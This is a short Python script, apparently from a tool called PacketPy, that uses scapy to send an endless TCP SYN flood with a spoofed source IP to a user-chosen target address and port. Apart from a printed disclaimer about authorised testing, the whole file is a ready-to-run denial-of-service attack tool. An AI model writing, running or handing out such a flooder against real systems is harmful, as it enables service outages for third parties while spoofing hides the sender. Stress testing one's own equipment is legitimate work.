# Simple TCP-SYN flood python script
# Standalone PacketPy script
# https://github.com/fortless

version = '1.1-01_beta' # Don't touch this

from scapy.all import *
from time import time as t
import socket
import os

def clearterminal():
    if os.name == str("nt"):
        os.system("cls")
    else:
        os.system("clear")
print("--------")
print("ATTENTION")
print("This tool was created to test devices’ abilities to withstand DoS attacks.")
print("Usage of this tool for malicious purposes without permission is prohibited.")
print("")
print("PacketPy " + str(version))
print("--------")
print("")
input("Press ENTER to continue ")
print("")
destip = input("Target IPv4 [127.0.0.1]: ")
if destip == "":
    destip = "127.0.0.1"
destport = input("Target port [80] [1-65500]: ")
if destport == "":
   destport = 80
srcip = input("Source IPv4 to use: ")
ip = IP(src=srcip, dst=destip)
tcp = TCP(sport=RandShort(), dport=int(destport))
raw = Raw(b"x"*1024)
p = ip / tcp / raw
clearterminal()
print("-----------------------------------------")
print("")
print(" -=- TCP payload in progress.. -=-")
print("")
print("")
print("- Target IP: " + str(destip) + "/32 -")
print("- Target Port: " + str(destport))
print("- TCP Payload size: Random")
print("- TCP Spoofed Source IP: " + str(srcip))
print("- OS: " + str(os.name) + " -")
print("- PacketPy version: " + str(version) + " -")
print("")
print("PacketPy, an open-source")
print("network tool library, written in")
print("Python.")
print("")
print("Interactive mode (TCP-SYN-SPOOFED flood)")
print("")
print("---> Press CTRL+C to stop the payload!")
print("-----------------------------------------")
send(p, loop=1, verbose=0)
